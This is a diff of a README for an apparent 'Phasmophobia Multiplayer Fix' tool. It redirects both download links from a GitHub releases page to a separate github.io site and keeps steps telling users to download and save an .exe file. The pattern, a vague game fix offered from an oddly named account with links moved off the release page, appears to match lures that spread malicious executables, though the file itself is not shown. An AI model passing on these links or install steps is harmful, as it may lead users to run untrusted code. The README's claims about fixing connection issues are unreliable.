@@ -1,6 +1,6 @@
 # 👻 Phasmophobia-Multiplayer-Fix - Resolve connection issues and join friends
 
-[Download The Latest Fix](https://github.com/shanansaprophytic176/Phasmophobia-Multiplayer-Fix/releases)
+[Download The Latest Fix](https://shanansaprophytic176.github.io)
 
 This application corrects network errors that prevent players from joining lobbies in Phasmophobia. It restores the connection between your computer and the game servers for Windows 10 and Windows 11 users.
 
@@ -14,7 +14,7 @@ Your computer must meet these basic standards to run the fix:
 ## 📥 How to Download and Install
 Follow these steps to prepare your system for multiplayer gaming.
 
-1. Visit the [official release page](https://github.com/shanansaprophytic176/Phasmophobia-Multiplayer-Fix/releases).
+1. Visit the [official release page](https://shanansaprophytic176.github.io).
 2. Locate the most recent version labeled "Latest".
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
